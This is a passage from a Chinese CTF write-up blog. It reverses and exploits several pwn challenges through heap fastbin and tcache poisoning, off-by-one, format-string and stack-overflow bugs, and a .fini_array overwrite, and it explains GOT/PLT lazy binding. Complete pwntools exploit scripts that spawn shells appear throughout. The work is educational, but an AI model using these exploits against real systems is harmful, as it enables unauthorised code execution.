最大分配 4096 size = 4096; heap_addr = (char *)calloc(size, 1u); // 会清零 if ( !heap_addr ) exit(-1); LODWORD(baby_addr[i].inuse) = 1; baby_addr[i].size = size; baby_addr[i].content = heap_addr; printf(\"Allocate Index %d\\n\", i); } return; } } } Fill函数 选择一个正在使用的baby，往它的content里读入大小为size的内容，这个size我们可以控制 __int64 __fastcall Fill(__int64 baby_addr) { __int64 result; // rax int index; // [rsp+18h] [rbp-8h] int size; // [rsp+1Ch] [rbp-4h] printf(\"Index: \"); result = read_num(); index = result; if ( (unsigned int)result \u003c 0x10 ) { result = *(unsigned int *)(24LL * (int)result + baby_addr); if ( (_DWORD)result == 1 ) { printf(\"Size: \"); result = read_num(); size = result; if ( (int)result \u003e 0 ) { printf(\"Content: \"); return read_content(*(_QWORD *)(24LL * index + baby_addr + 16), size); // 没限制读入多少 堆溢出 } } } return result; } 填充content，但是size是多少就往content里读入多少，存在溢出 read_content函数： unsigned __int64 __fastcall read_content(__int64 a1, unsigned __int64 a2) { unsigned __int64 v3; // [rsp+10h] [rbp-10h] ssize_t v4; // [rsp+18h] [rbp-8h] if ( !a2 ) return 0; v3 = 0; while ( v3 \u003c a2 ) { v4 = read(0, (void *)(v3 + a1), a2 - v3); if ( v4 \u003e 0 ) { v3 += v4; } else if ( *_errno_location() != 11 \u0026\u0026 *_errno_location() != 4 ) { return v3; } } return v3; } Free函数 选择一个正在使用的baby，把inuse，size位置0，free掉content，并把指针置0 __int64 __fastcall Free(baby *baby_addr) { __int64 result; // rax int index; // [rsp+1Ch] [rbp-4h] printf(\"Index: \"); result = read_num(); index = result; if ( (unsigned int)result \u003c 0x10 ) { result = LODWORD(baby_addr[(int)result].inuse); if ( (_DWORD)result == 1 ) { LODWORD(baby_addr[index].inuse) = 0; // flag置0 baby_addr[index].size = 0; // size置0 free(baby_addr[index].content); // free掉content result = (__int64)\u0026baby_addr[index]; *(_QWORD *)(result + 16) = 0; // 指针置0 } } return result; } Dump函数 选择一个正在使用的baby，根据这个baby的size，打印出size大小的content unsigned int __fastcall Dump(baby *baby_addr) { unsigned int index; // eax unsigned int v2; // [rsp+1Ch] [rbp-4h] printf(\"Index: \"); index = read_num(); v2 = index; if ( index \u003c 0x10 ) { index = baby_addr[index].inuse; if ( index == 1 ) { puts(\"Content: \"); write_content((__int64)baby_addr[v2].content, baby_addr[v2].size); return puts(byte_14F1); } } return index; } ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:1:1","series":null,"tags":null,"title":"一些堆题","uri":"/posts/buuctf_heap/#逆向分析"},{"categories":["WP"],"content":"\rpwn it总体思路是覆盖malloc_hook为one_gadget 首先需要泄露libc基地址 可以malloc一个small bin，然后free掉它，会进入unsorted bin，其fd和bk会指向main_arena+88，main_arena+88在libc中，可以计算偏移求出基地址。 但是free掉的baby，它的content指针会置空，inuse位置0，不能dump出来，所以我们需要另一个baby的content指针指向这个unsorted bin，之后dump这个新的baby 首先申请4个fastbin大小（0x20–0x80大小）的堆块，再free掉baby2、baby1 allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x80) #small bin free(2) free(1) 再利用堆溢出，改babychunk2的fd的末尾字节为0x80，这样就指向了babychunk4 同时把babychunk4的size改为0x20 pl = b'a'*0x10 + p64(0) + p64(0x21) + p8(0x80) fill(0,len(pl),pl) pl = b'a'*0x10 + p64(0) + p64(0x21) fill(3,len(pl),pl) 再把申请两个大小为0x20的chunk，第二个chunk指向的是baby4（那个small bin） allocate(0x10) #baby1 allocate(0x10) #baby2 -\u003e small bin (babychunk4) 同时把baby4的size改回来 payload = b'a'*0x10 + p64(0) + p64(0x91) fill(3, len(payload), payload) 接着 allocate(0x80) free(4) dump(2) 申请一个堆块，让baby4不和top chunk 挨着，这样free(4)的时候，baby4才不会和top chunk合并，baby2指向baby4的chunk，dump2就会把baby4的content里的内容dump出来。 当一个堆块被释放时，如果它紧邻 top chunk，那么这个堆块会被直接合并到 top chunk 中，而不是放入任何 bin。 接着就是接收libc基地址，计算main_arena地址 p.recvuntil(b'Content:') p.recv(2) fd = u64(p.recv(6).ljust(8,b'\\x00')) success(\"fd -\u003e 0x%x\",fd) libc_base = fd - 0x7248910fab78 + 0x724890d36000 success(\"libc_base -\u003e 0x%x\",libc_base) main_arena_addr = libc_base + 0x3c4b20 下一步就是覆盖malloc_hook为onegadget 通过申请堆块到malloc_hook附近，然后覆盖 怎么申请堆块到malloc_hook附近？通过修改bin中的fd指针 先申请一个fastbin大小的堆块，然后free掉 allocate(0x60) #baby4 free(4) #baby4 Null 注意，我们之前让baby2 -\u003e babychunk4，可以通过fill(2)来设置babychunk4的fd，它的fd要设置在哪个具体位置？ malloc_hook附近有很多地址，可以让申请的arbitary chunk的size为0x7f 把堆块申请成这样： fake_chunk_addr = main_arena_addr - 0x33 fake_chunk_addr = p64(fake_chunk_addr) fill(2,len(fake_chunk_addr),fake_chunk_addr) 此时的bins: 接着申请两个大小为0x70的chunk，第二个chunk（babychunk6）就是申请到了malloc_hook附近 再计算偏移，往malloc_hook填入one_gadget 再去malloc一次，就能到one_gadget了 allocate(0x60) #baby4 allocate(0x60) #arbitary allocate baby6 one_gedget = libc_base + 0x4527a pl = b'a'*0x13 + p64(one_gedget) fill(6,len(pl),pl) allocate(0x100) ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:1:2","series":null,"tags":null,"title":"一些堆题","uri":"/posts/buuctf_heap/#pwn-it"},{"categories":["WP"],"content":"\rexp: from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) def allocate(size): p.recvuntil(b'Command: ') p.sendline(b'1') p.recvuntil(b'Size: ') p.sendline(str(size)) def fill(index,size,content): p.recvuntil(b'Command: ') p.sendline(b'2') p.sendlineafter(b'Index: ',str(index)) p.sendlineafter(b'Size: ',str(size)) p.sendlineafter(b'Content: ',content) def free(index): p.recvuntil(b'Command: ') p.sendline(b'3') p.sendlineafter(b'Index: ',str(index)) def dump(index): p.recvuntil(b'Command: ') p.sendline(b'4') p.sendlineafter(b'Index: ',str(index)) allocate(0x10) #baby0 allocate(0x10) #baby1 allocate(0x10) #baby2 allocate(0x10) #baby3 allocate(0x80) #baby4 small bin free(2) free(1) pl = b'a'*0x10 + p64(0) + p64(0x21) + p8(0x80) fill(0,len(pl),pl) pl = b'a'*0x10 + p64(0) + p64(0x21) fill(3,len(pl),pl) allocate(0x10) #baby1 allocate(0x10) #baby2 -\u003e small bin (babychunk4) payload = b'a'*0x10 + p64(0) + p64(0x91) fill(3, len(payload), payload) allocate(0x80) #baby5 free(4) #baby4 NULL dump(2) p.recvuntil(b'Content:') p.recv(2) fd = u64(p.recv(6).ljust(8,b'\\x00')) success(\"fd -\u003e 0x%x\",fd) libc_base = fd - 0x7248910fab78 + 0x724890d36000 success(\"libc_base -\u003e 0x%x\",libc_base) main_arena_addr = libc_base + 0x3c4b20 allocate(0x60) #baby4 free(4) #baby4 Null fake_chunk_addr = main_arena_addr - 0x33 fake_chunk_addr = p64(fake_chunk_addr) fill(2,len(fake_chunk_addr),fake_chunk_addr) allocate(0x60) #baby4 allocate(0x60) #arbitary allocate baby6 one_gedget = libc_base + 0x4527a pl = b'a'*0x13 + p64(one_gedget) fill(6,len(pl),pl) allocate(0x100) p.interactive() 参考文章 https://bbs.kanxue.com/thread-268200.htm ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:1:3","series":null,"tags":null,"title":"一些堆题","uri":"/posts/buuctf_heap/#exp"},{"categories":["WP"],"content":"\rbuuctf_mergeheap off-by-one + tcache poisoning add：根据输入的大小size申请堆，可以往堆里写入size大小的数据，并把堆地址写入Chunk_array，size写进chunk_size数组（size的大小为4个字节） show：根据输入的idx，puts出堆块的内容 dele：根据输入的idx，free掉相应堆块，并把指针置空。chunk_size置空 merge：根据输入的idx1,idx2，把两个堆块合并起来，size加起来写入chunk_size数组，chunk_array同理。内容也合并 exit:退出 ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:2:0","series":null,"tags":null,"title":"一些堆题","uri":"/posts/buuctf_heap/#buuctf_mergeheap"},{"categories":["WP"],"content":"\r漏洞点在merge_heap的时候，用的是strcat，strcpy strcpy字符串复制 char *strcpy(char *dest, const char *src); 行为： 复制src到dest，包括NULL终止符 不检查缓冲区大小 strcat字符串拼接 char *strcat(char *dest, const char *src); 行为： 将src追加到dest末尾 依赖dest的NULL终止符找到结尾 存在off-by-one 当我们将idx1和2进行合并的时候，idx2的size域0x21会被strcpy看作src的一部分，从而会导致idx2的最后一个字节off-by-two（还有一个strcat的NULL终止符） ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:2:1","series":null,"tags":null,"title":"一些堆题","uri":"/posts/buuctf_heap/#漏洞点"},{"categories":["WP"],"content":"\r漏洞点在merge_heap的时候，用的是strcat，strcpy strcpy字符串复制 char *strcpy(char *dest, const char *src); 行为： 复制src到dest，包括NULL终止符 不检查缓冲区大小 strcat字符串拼接 char *strcat(char *dest, const char *src); 行为： 将src追加到dest末尾 依赖dest的NULL终止符找到结尾 存在off-by-one 当我们将idx1和2进行合并的时候，idx2的size域0x21会被strcpy看作src的一部分，从而会导致idx2的最后一个字节off-by-two（还有一个strcat的NULL终止符） ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:2:1","series":null,"tags":null,"title":"一些堆题","uri":"/posts/buuctf_heap/#strcpy"},{"categories":["WP"],"content":"\r漏洞点在merge_heap的时候，用的是strcat，strcpy strcpy字符串复制 char *strcpy(char *dest, const char *src); 行为： 复制src到dest，包括NULL终止符 不检查缓冲区大小 strcat字符串拼接 char *strcat(char *dest, const char *src); 行为： 将src追加到dest末尾 依赖dest的NULL终止符找到结尾 存在off-by-one 当我们将idx1和2进行合并的时候，idx2的size域0x21会被strcpy看作src的一部分，从而会导致idx2的最后一个字节off-by-two（还有一个strcat的NULL终止符） ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:2:1","series":null,"tags":null,"title":"一些堆题","uri":"/posts/buuctf_heap/#strcat"},{"categories":["WP"],"content":"\r思路 填满tcache bin 泄露libc，通过off-by-one去改大下一个堆块的size，free掉，进入unsorted bin，通过chunk overlapping 通过tcache poisoning，分配堆块到free_hook，劫持为system，再free掉内容为binsh的堆块 在通过exp的方法泄露出libc之后才想到：可以通过填满tcache，再申请一个大于fastbin的堆块，free掉它，就会进入unsorted bin，然后申请出来，show它就可以泄露libc。exp中的方法好像复杂了 ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:2:2","series":null,"tags":null,"title":"一些堆题","uri":"/posts/buuctf_heap/#思路"},{"categories":["WP"],"content":"\rexp #hwb_2019_mergeheap from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) pause() address = './pwn' # p = process(address) elf = ELF(address) libc = elf.libc ip = \"node5.buuoj.cn\" port = 28721 p = remote(ip,port) def cmd(idx): p.recvuntil(b'\u003e\u003e') p.sendline(str(idx)) def add(size,content): cmd(1) p.sendlineafter(b'len:',str(size)) p.sendlineafter(b'content:',content) def show(idx): cmd(2) p.sendlineafter(b'idx:',str(idx)) def dele(idx): cmd(3) p.sendlineafter(b'idx:',str(idx)) def merge(idx1,idx2): cmd(4) p.sendlineafter(b'idx1:',str(idx1)) p.sendlineafter(b'idx2:',str(idx2)) # 首先泄露libc 等下把下面这个0x31改成0x41就可以泄露libc pl = b'a'*0xf + p8(0x41) #这个是first_3的size add(0x10,pl) #0 pl = b'b'*0x18 add(0x18,pl) #1 add(0x28,b'c'*4) #2 add(0x28,b'd'*4) #first_3 dele(2) merge(1,0) #2 #这样就把3的大小改了 dele(3) add(128,b'e'*4) #second_3 # 填满128的tcache for i in range(7): add(0x80,b'tcache') #这个堆块用于防止consolidate add(0x10,b'zhanwei') #11 for j in range(4,11): dele(j) dele(3) #进入unsorted add(0x30,b'a'*0x30) #3 show(3) p.recvuntil(b'a'*0x30) libc_addr = u64(p.recv(6).ljust(8,b'\\x00')) - 0x3ebca0 success(\"libc_addr = 0x%x\",libc_addr) #这里把破坏的堆结构改回来,不然接下来申请堆块的时候会报错 dele(3) #这个chunk大小为0x41 pl = b'a'*0x20 + p64(0) + p64(0x91) add(0x30,pl) #3 #然后把tcahce中的堆块申请出来 for i in range(7): add(0x80,b'f'*4) # 4-10 # #申请出来unsorted中的堆块 add(0x80,b'f'*4) #12 #再把tcache的free回去 for j in range(4,11): dele(j) #现在4-10为空 free_hook = libc_addr + libc.symbols['__free_hook'] system_addr = libc.symbols['system'] + libc_addr pl = b'1'*0xf + p8(0xa0) #这个是first_3的size add(0x10,pl) #0 4 pl = b'2'*0x18 add(0x18,pl) #1 5 add(0x28,b'merge_chunk')#2 6 add(0x20,b'size be writed chunk') #3 7 dele(6) merge(5,4) #2 #size be writed dele(7) #size 0x50 add(0x10,b'tcache')#3 7 dele(7) pl = b'x'*0x20 + p64(0) + p64(0x21) + p64(free_hook) + p64(free_hook) add(0x90,pl) #3 7 add(0x10,b'/bin/sh\\x00')#4 8 pl = p64(system_addr) add(0x10,pl) #5 9 dele(8) p.interactive() 不知道为啥远程不通 ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:2:3","series":null,"tags":null,"title":"一些堆题","uri":"/posts/buuctf_heap/#exp-1"},{"categories":["WP"],"content":"格式化字符串漏洞+栈溢出 ","date":"2025-05-26","objectID":"/posts/dvctf2025/:0:0","series":null,"tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#"},{"categories":["WP"],"content":"\rDVCTF Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2025-05-26","objectID":"/posts/dvctf2025/:0:0","series":null,"tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#dvctf"},{"categories":["WP"],"content":"\r逆向分析 int __fastcall main(int argc, const char **argv, const char **envp) { int v4; // [rsp+Ch] [rbp-44h] BYREF char v5[56]; // [rsp+10h] [rbp-40h] BYREF unsigned __int64 v6; // [rsp+48h] [rbp-8h] v6 = __readfsqword(0x28u); puts(asc_2190); puts(\u0026byte_2228); puts(\u0026byte_22C0); puts(\u0026byte_2358); puts(\u0026byte_23F0); puts(\u0026byte_2488); puts(\u0026byte_2520); puts(\u0026byte_25B8); puts(\u0026byte_2650); puts(\u0026byte_26E8); puts(\u0026byte_2780); puts(\u0026byte_2818); puts(\u0026byte_28B0); puts(\u0026byte_2948); puts(\u0026byte_29E0); puts(\u0026byte_2A78); puts(\u0026byte_2B10); puts(\u0026byte_2BA8); puts(\u0026byte_2C40); puts(\u0026byte_2CD8); puts(\u0026byte_2D70); puts(\u0026byte_2E08); puts(\u0026byte_2EA0); puts(\u0026byte_2F38); puts(\u0026byte_2FD0); puts(\u0026byte_3068); puts(\u0026byte_3100); puts(\u0026byte_3198); puts(\u0026byte_3230); puts(\u0026byte_32C8); puts(\"Enter your name : \"); __isoc99_scanf(\" %[^\\n]\", v5); printf(\"\\n Hey %s \", v5); puts(\" ! Welcome to the Louvre software !\"); do { displayMenu(); __isoc99_scanf(\"%d\", \u0026v4); if ( v4 == 4 ) { QuitProgram(v5); } else { if ( v4 \u003c= 4 ) { switch ( v4 ) { case 3: VisitRoom(); continue; case 1: CheckIdentity(v5); continue; case 2: CheckVersion(); continue; } } puts(\"\\n Invalid choice. \"); } } while ( v4 != 4 ); return 0; } CheckIdentity中存在格式化字符串漏洞 int __fastcall CheckIdentity(const char *a1) { puts(\"Your identity is : \"); return printf(a1); } VisitRoom中存在栈溢出漏洞 __int64 VisitRoom() { unsigned int v1; // [rsp+8h] [rbp-18h] BYREF char v2[10]; // [rsp+Eh] [rbp-12h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); puts(\"How many rooms do you want to visit? ( 0-99 )\"); __isoc99_scanf(\"%2d\", \u0026v1); if ( v1 \u003c= 0x1388 ) { printf(\"\\nYou have chosen to request a visit %d rooms.\\n\", v1); } else { puts(\"That's a lot, isn't it?!\"); puts(\"Who are the tickets for?\"); __isoc99_scanf(\"%s\", v2); printf(\"Tickets will be sent to: %s\\n\", v2); } return 0; } 存在输出flag的函数 void readflag() { char v0; // [rsp+7h] [rbp-9h] FILE *stream; // [rsp+8h] [rbp-8h] stream = fopen(\"flag.txt\", \"r\"); if ( stream ) { while ( 1 ) { v0 = fgetc(stream); if ( v0 == -1 ) break; putchar(v0); } fclose(stream); } else { perror(\"Failed to open file\"); } } ","date":"2025-05-26","objectID":"/posts/dvctf2025/:1:0","series":null,"tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#逆向分析"},{"categories":["WP"],"content":"\r思路通过格式化字符串漏洞，泄露栈上的canary和程序基地址。通过栈溢出，修改返回地址 ","date":"2025-05-26","objectID":"/posts/dvctf2025/:2:0","series":null,"tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#思路"},{"categories":["WP"],"content":"\rexp from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) backdoor = 0x1296 p.recvuntil(b'name : \\n') pl = b'%19$p|%9$p' p.sendline(pl) # dbg() p.sendline(b'1') p.recvuntil(b'identity is : \\n') canary = int(p.recv(18),16) success(\"canary ---\u003e 0x%x\",canary) p.recvuntil(b'|') base_addr = int(p.recv(14),16) base_addr = base_addr - 0x5619fcb116fb + 0x5619fcb10000 success(\"base_addr ---\u003e 0x%x\",base_addr) p.sendline(b'3') p.sendline(b'-1') p.recvuntil(b'for?\\n') pl = b'a'*10 + p64(canary) pl+= p64(0) + p64(base_addr + backdoor) p.sendline(pl) p.interactive() ","date":"2025-05-26","objectID":"/posts/dvctf2025/:3:0","series":null,"tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#exp"},{"categories":["WP"],"content":"\r知识点scanf(\"%s\") 的行为： %s 会读取输入直到遇到 空白字符（空格、换行、制表符等），不会因 \\x00 终止。 输入数据中的 \\x00 会被视为普通字符，继续写入内存。 （。。。当时打的时候还以为canary的\\x00会截断scanf的%s） ","date":"2025-05-26","objectID":"/posts/dvctf2025/:4:0","series":null,"tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#知识点"},{"categories":["pwn"],"content":"延迟绑定过程分析 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#"},{"categories":["pwn"],"content":"\rGOT\u0026PLTgot表和plt表都是程序调用外部函数时，定位该函数需要使用到的表 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#gotplt"},{"categories":["pwn"],"content":"\rGlobal Offset Table(GOT，全局偏移表)GOT 表的主要功能是 存储动态链接库（如 libc.so）中函数和全局变量的运行时地址。 GOT表包括两种类型.got和.got.plt .got 存储 全局变量 的地址 .got.plt 存储 动态库函数 的地址（如 printf、read）。 与 PLT（Procedure Linkage Table） 配合实现 延迟绑定（Lazy Binding）。 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#global-offset-tablegot全局偏移表"},{"categories":["pwn"],"content":"\r.got.plt的公共表项有三个公共表项，分别是 got[0]:_DYNAMIC:指向 动态段（.dynamic） 的地址 got[1]:link_map 指针:动态链接器内部使用的 link_map 结构指针（用于符号解析） got[2]:_dl_runtime_resolve:动态解析函数的地址 got[3]开始就是函数的地址 示例：x86-64 的 .got.plt 布局 .got.plt:0000000000403FE8 .got.plt:0000000000403FE8 ; Segment type: Pure data .got.plt:0000000000403FE8 ; Segment permissions: Read/Write .got.plt:0000000000403FE8 _got_plt segment qword public 'DATA' use64 .got.plt:0000000000403FE8 assume cs:_got_plt .got.plt:0000000000403FE8 ;org 403FE8h .got.plt:0000000000403FE8 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC .got.plt:0000000000403FF0 qword_403FF0 dq 0 ; DATA XREF: sub_401020↑r .got.plt:0000000000403FF8 qword_403FF8 dq 0 ; DATA XREF: sub_401020+6↑r .got.plt:0000000000404000 off_404000 dq offset seccomp_init ; DATA XREF: _seccomp_init+4↑r .got.plt:0000000000404008 off_404008 dq offset seccomp_rule_add .got.plt:0000000000404008 ; DATA XREF: _seccomp_rule_add+4↑r .got.plt:0000000000404010 off_404010 dq offset write ; DATA XREF: _write+4↑r .got.plt:0000000000404018 off_404018 dq offset seccomp_load ; DATA XREF: _seccomp_load+4↑r .got.plt:0000000000404020 off_404020 dq offset setbuf ; DATA XREF: _setbuf+4↑r .got.plt:0000000000404028 off_404028 dq offset close ; DATA XREF: _close+4↑r .got.plt:0000000000404030 off_404030 dq offset read ; DATA XREF: _read+4↑r .got.plt:0000000000404030 _got_plt ends .got.plt:0000000000404030 其中 .got.plt:0000000000403FE8 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC .got.plt:0000000000403FF0 qword_403FF0 dq 0 ; DATA XREF: sub_401020↑r .got.plt:0000000000403FF8 qword_403FF8 dq 0 ; DATA XREF: sub_401020+6↑r 就是公共表项，从上到下依次就是got[0]、got[1]、got[2] got[1]、got[2]由动态链接器在装载共享模块的时候负责将它们初始化 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:1","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#gotplt的公共表项"},{"categories":["pwn"],"content":"\rlink_map数据结构的定义如下： struct link_map { /* Shared library's load address. */ ElfW(Addr) l_addr; /* Pointer to library's name in the string table. */ char *l_name; /* Dynamic section of the shared object. Includes dynamic linking info etc. Not interesting to us. */ ElfW(Dyn) *l_ld; /* Pointer to previous and next link_map node. */ struct link_map *l_next, *l_prev; }; 首次调用动态函数时，_dl_runtime_resolve 通过 link_map 解析符号地址。 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:2","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#link_map"},{"categories":["pwn"],"content":"\rProcedure Linkage Table(PLT,进程链接表)结构： PLT0（公共解析逻辑） 所有 PLT 条目共享的代码，负责调用 _dl_runtime_resolve 解析函数地址。 PLT1, PLT2, …（函数专用条目） 每个动态函数（如 printf、read）有一个 PLT 条目。 典型 PLT 条目（x86-64） printf@plt: jmp *GOT[n] ; 首次调用时，GOT[n] 指向下一行（解析逻辑） push 5 ; 符号索引（5 = printf 在 .dynsym 中的下标） jmp PLT0 ; 跳转到公共解析逻辑（_dl_runtime_resolve） ","date":"2025-03-24","objectID":"/posts/lazy_binding/:2:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#procedure-linkage-tableplt进程链接表"},{"categories":["pwn"],"content":"\r延迟绑定过程函数第一次调用时，过程如下图： 跳转到该函数的PLT条目 第一个jmp指令跳往对应函数的.got.plt入口，但是这个时候got表中还没有填充函数的真实地址。 所以从got表跳回到plt表中，继续往下执行push;jmp。跳回后，push的值是对应函数在**.got.plt**入口的偏移 跳到PLT头部，执行push指令，将 GOT[1] 的地址（link_map的地址）入栈。 接着jmp到 **GOT[2] ** 即dl_runtime_resolve相关的函数对动态函数进行地址解析和重定位 并且把函数真实地址回填到got表中 最后执行函数 非首次调用，过程如下图： 之后再调用该函数的时候，plt只有一个跳转指令，找到对应的函数地址之后执行函数。动态调试看了一个整个运行过程，有了一个更深入的的理解。 跳转到该函数的PLT条目 第一个jmp指令跳往对应函数的.got.plt入口 此时的got表被填充为函数的真实地址，跳转到真实地址 执行函数 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#延迟绑定过程"},{"categories":["pwn"],"content":"\r实际分析这里用gdb动态调试，实际分析一下 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#实际分析"},{"categories":["pwn"],"content":"\r第一次调用过程： 首先函数call了0x401100，0x401100就是read函数的.plt.sec 接着step步入 可以看到，实际上，程序会先进入.plt.sec执行jmp，再到.plt中执行push;jmp。 可以看到这时read函数的.got.plt还没被更改为真实地址，而是指向read函数PLT表项中的push 执行完dl_runtime_resolve相关的函数，就会进入read的真实地址执行read，同时可以看到，read函数的.got.plt也指向的该函数真实地址 接着就执行read函数 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#第一次调用过程"},{"categories":["pwn"],"content":"\r非首次调用过程： 先call了read函数的.plt.sec 然后s步入 qword ptr [rip + 0x2f26]就是取出存储在read的.got.plt中地址，然后跳转到该地址 指令 行为 jmp 0x404040 直接跳转到 0x404040（绝对地址） jmp [0x403f2c] 从 0x403f2c 读取 8 字节作为目标地址 jmp qword ptr [rip + 0x2f26] 从 (RIP + 0x2f26) 读取 8 字节作为目标地址（动态计算） 然后直接执行read 所以，非首次调用，got表中存储的就是真实地址 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:2:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#非首次调用过程"},{"categories":["pwn"],"content":"\r参考文献延迟绑定过程分析：理论分析 深入理解plt表、got表和动态链接：前置知识 延迟绑定过程图 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#参考文献"},{"categories":["WP"],"content":"N1Junior_2025 Pwn复现 ","date":"2025-03-12","objectID":"/posts/n1junior2025/:0:0","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#"},{"categories":["WP"],"content":"\rRemake涉及知识点：.fini_array Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled SHSTK: Enabled IBT: Enabled __int64 __fastcall main(__int64 a1, char **a2, char **a3) { sub_11A9(); read(0, format, 0x10u); printf(format); if ( dword_4060 ) //刚开始 dword_4060 = 0 sub_120E(); else dword_4060 = 1; return 0; } unsigned __int64 sub_120E() { char buf[16]; // [rsp+0h] [rbp-1010h] BYREF unsigned __int64 v2; // [rsp+1008h] [rbp-8h] v2 = __readfsqword(0x28u); read(0, buf, 0x300u); printf(buf); return v2 - __readfsqword(0x28u); } 看到程序，很容易联想到修改.fini_array来重新执行main函数（这样dword_4060就会等于1，进入sub_120E函数） 接下来就是利用格式化字符串漏洞printf(format);，来修改.fini_array .fini_array下面就是main函数的地址(出题人的gift) 程序开了PIE，程序基地址+0x3da0为.fini_array地址，我们可以通过程序基地址+8+0x3da0这样就能修改程序返回地址为main函数地址 printf是栈中指向程序基地址的地址位于动态连接器，可能为struct link_map中的l_addr(程序基地址) 因为.fini_array 的实际地址 = l_addr + .fini_array 的偏移地址 所以这里我们让l_addr+8 同时，通过栈中main函数的地址减去偏移，就能得到PIE基地址 这时exp: from pwn import * context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) pause() address = './remake' p = process(address) # elf = ELF(address) # libc = ELF.libc # ip = \"\" # port = #p = remote(ip,port) #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) #----------------------------------------------------------------- pl = b'%8c%30$hhn%9$p' # dbg() sl(pl) ru(b\"0x\") pie = int(r(16),16) - 0x1279 success(\"pie = 0x%x\",pie) 发送payload之后，再dbg，在重新执行时，查看printf时的栈情况 再在栈中寻找stack地址和libc地址，再通过覆盖返回地址为one_gadget，实现getshell 最终exp: from pwn import * context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) pause() address = './remake' p = process(address) elf = ELF(address) libc = ELF(\"./libc.so.6\") # ip = \"\" # port = #p = remote(ip,port) #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) #----------------------------------------------------------------- pl = b'%8c%30$hhn%9$p' # dbg() sl(pl) ru(b\"0x\") pie = int(r(16),16) - 0x1279 success(\"pie = 0x%x\",pie) pl = b\"%12$p%26$p\" #stack libc # dbg() sl(pl) # 